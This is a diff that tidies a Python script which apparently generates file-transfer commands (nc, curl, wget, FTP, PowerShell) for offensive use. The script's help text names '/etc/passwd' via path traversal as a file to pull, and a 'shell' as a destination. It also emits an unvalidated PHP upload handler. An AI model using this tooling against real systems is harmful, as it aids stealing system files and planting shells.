@@ -9,11 +9,11 @@ TEXT="\033[0;37;0m"
 IMPORTANT="\033[0;32;0m"
 
 def add_divider():
-   return f'{TEXT}'+f'-'*80 + '\n'
+   return f'{TEXT}'+'-'*80 + '\n'
 
 def add_option():
     data=add_divider()
-    data+= f' '*39  + f'{TEXT}OR\n'
+    data+= ' '*39  + f'{TEXT}OR\n'
     data+=add_divider()
     return data
 
@@ -34,39 +34,39 @@ def generate_php_file(args):
     uploadfilename=args.uploadfilename
     host=args.host
     port=args.port
-    data=f'\n\n{TEXT}'+f'='*80 + '\n'
-    data+=' '*30+f'Web Server upload PHP\n'
+    data=f'\n\n{TEXT}'+'='*80 + '\n'
+    data+=' '*30+'Web Server upload PHP\n'
     data+=f'{TEXT} Please ensure the following upload functionality is enabled on your webserver\n'
-    data+=f'{TEXT}'+f'='*80 + '\n'
+    data+=f'{TEXT}'+'='*80 + '\n'
     data+=f'{IMPORTANT}cat << EOF > {uploadfilename}\n'
-    data+=f'<?php\n'
-    data+=f'  \\$uploaddir = \'/tmp/uploads/\';\n'
-    data+=f'  \\$uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
-    data+=f'  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile)\n'
-    data+=f'?>\n'
-    data+=f'EOF\n'
+    data+='<?php\n'
+    data+='  \\$uploaddir = \'/tmp/uploads/\';\n'
+    data+='  \\$uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
+    data+='  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile)\n'
+    data+='?>\n'
+    data+='EOF\n'
     data+=add_option()
     data+=f'{IMPORTANT}cat << EOF > {uploadfilename}\n'
-    data+=f'<?php\n'
+    data+='<?php\n'
     data+='if (isset(\\$_FILES[\'file\'])){\n'
-    data+=f'  $uploaddir = \'/tmp/uploads/\';\n'
-    data+=f'  $uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
-    data+=f'  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile);\n'
+    data+='  $uploaddir = \'/tmp/uploads/\';\n'
+    data+='  $uploadfile = \\$uploaddir . \\$_FILES[\'file\'][\'name\'];\n'
+    data+='  move_uploaded_file(\\$_FILES[\'file\'][\'tmp_name\'], \\$uploadfile);\n'
     data+='} else {\n'
     data+=f'  echo "<form action=\'/{uploadfilename}\' method=\'post\' enctype=\'multipart/form-data\'>";\n'
-    data+=f'  echo "<input type=\'file\' name=\'file\'>";\n'
-    data+=f'  echo "<input type=\'submit\' name=\'submit\'>";\n'
-    data+=f'  echo "</form>";\n'
+    data+='  echo "<input type=\'file\' name=\'file\'>";\n'
+    data+='  echo "<input type=\'submit\' name=\'submit\'>";\n'
+    data+='  echo "</form>";\n'
     data+='}\n'
-    data+=f'?>\n'
-    data+=f'EOF\n'
-    data+=f'{TEXT}'+f'='*80 + '\n'
+    data+='?>\n'
+    data+='EOF\n'
+    data+=f'{TEXT}'+'='*80 + '\n'
     data+=' '*32 +f'{TEXT}Start a webserver\n'
-    data+=f'{TEXT}'+f'='*80 + '\n'
+    data+=f'{TEXT}'+'='*80 + '\n'
     data+=f'{COMMAND}sudo systemctl start apache2\n'
     data+=add_option()
     data+=f'{COMMAND}php -S {host}:{port}\n'
-    data+=f'{TEXT}'+f'='*80 + '\n\n'
+    data+=f'{TEXT}'+'='*80 + '\n\n'
     return data
 
 def wrap_command(command):
@@ -79,9 +79,7 @@ def wrap_command(command):
 
 def generate_nc(args):
     command=''
-    path=args.path
     filename=args.Filename
-    uploadfilename=args.uploadfilename
     host=args.host
     port=args.port
     destination=args.dest
@@ -128,10 +126,8 @@ def generate_curl(args):
     write_output(command, args)
 
 def generate_wget(args):
-    data=''
     path=args.path
     filename=args.Filename
-    uploadfilename=args.uploadfilename
     host='http://'+args.host
     port=args.port
     destination=args.dest
@@ -179,7 +175,6 @@ def generate_powershell(args):
 def generate_ftp(args):
     command=''
     host=args.host
-    port=args.port
     filename=args.Filename
     username=args.user
     password=args.password
@@ -197,8 +192,8 @@ def generate_ftp(args):
         command= f'{COMMAND}ftp {host} <<EOF\n'
         command+=f'USER {username} {password}\n'
         command+=f'{action} {filename}\n'
-        command+=f'bye\n'
-        command+=f'EOF\n'
+        command+='bye\n'
+        command+='EOF\n'
 
     write_output(wrap_command(command), args)
 
@@ -208,7 +203,7 @@ parser.add_argument('Filename', help='''The file you would like to transfer, rel
                     Eg. '../../../etc/passwd', '/etc/passwd',  'http://<IP>/file' ''')
 
 parser.add_argument('-d','--destination',dest='dest',  help='''The destination location relative to where the commands will be run.
-                    Eg. '/tmp/shell', 'c:\\Windows\System32\Temp\shell.exe' ''')
+                    Eg. '/tmp/shell', 'c:\\Windows\\System32\\Temp\\shell.exe' ''')
 
 parser.add_argument('-t', '--target', dest='target', choices=['linux','windows'],
                     help='The target platform where the command will be run to transfer a file.',
@@ -227,8 +222,8 @@ parser.add_argument('-o', '--output', dest='output', help='The filepath to write
 
 parser.add_argument('--path', help='The path used in curl, wget put', default='/')
 parser.add_argument('--uploadfilename', help='The alternate filename for upload.php (curl,wget put)', default='upload.php')
-parser.add_argument('--host', dest='host', help='The hostname or ip of the host we are targetting. ftp,curl,wget,nc')
-parser.add_argument('--port', dest='port', help='The portn of the host we are targetting. ftp,curl,wget,nc', default="80")
+parser.add_argument('--host', dest='host', help='The hostname or ip of the host we are targeting. ftp,curl,wget,nc')
+parser.add_argument('--port', dest='port', help='The portn of the host we are targeting. ftp,curl,wget,nc', default="80")
 parser.add_argument('--https', help='HTTPS instead of the default http')
 
 argcomplete.autocomplete(parser)
